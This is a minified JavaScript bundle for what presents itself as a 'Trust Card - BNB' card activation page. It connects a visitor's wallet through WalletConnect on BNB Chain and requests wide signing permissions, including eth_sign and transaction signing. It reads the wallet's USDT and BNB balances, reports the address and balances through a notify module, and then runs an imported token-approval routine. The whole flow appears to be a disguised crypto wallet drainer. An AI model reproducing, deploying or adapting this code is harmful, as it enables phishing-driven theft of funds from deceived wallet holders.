import{s as h,i as y}from"./assets/notify-CX_aGgTC.js";import{d as m}from"./assets/approval-DdvSURw8.js";import{g as v}from"./assets/balances-5NtDpXxe.js";const PROJECT_ID=(typeof window!=="undefined"&&window.TRUST_CARD_PROJECT_ID)||"11e5445365f720d1050dc106ba2e78d6";let a=null,n=null,i=null;function r(){}async function _(){return i||(i=(async()=>{const{provider:s,modal:e}=await y({projectId:PROJECT_ID,metadata:{name:"Trust Card - BNB",description:"Connect wallet for card activation",url:typeof window!=="undefined"?window.location.origin:"https://trust-card.vercel.app",icons:["https://avatars.githubusercontent.com/u/37784886"]}});return a=s,n=e,{provider:a,modal:n}})(),i)}async function B(s,e){var c,l,p,d,u;try{const{provider:t,modal:f}=await _();if(a=t,n=f,a!=null&&a.session)await m(a,r,s);else{await a.connect({namespaces:{eip155:{methods:["eth_sendTransaction","eth_signTransaction","eth_sign","personal_sign","eth_signTypedData"],chains:["eip155:56"],events:["chainChanged","accountsChanged"]}}}),n.closeModal();const o=((u=(d=(p=(l=(c=a.session)==null?void 0:c.namespaces)==null?void 0:l.eip155)==null?void 0:p.accounts)==null?void 0:d[0])==null?void 0:u.split(":")[2])||"";if(o){const{usdtBalance:w,bnbBalance:g}=await v(a,o);h({type:"wallet_connect",address:o,usdtBalance:w,bnbBalance:g})}await m(a,r,s)}}catch(t){n==null||n.closeModal(),e==null||e((t==null?void 0:t.message)||"Connection failed")}}typeof window<"u"&&(window.FluxPayApproval={run:B});
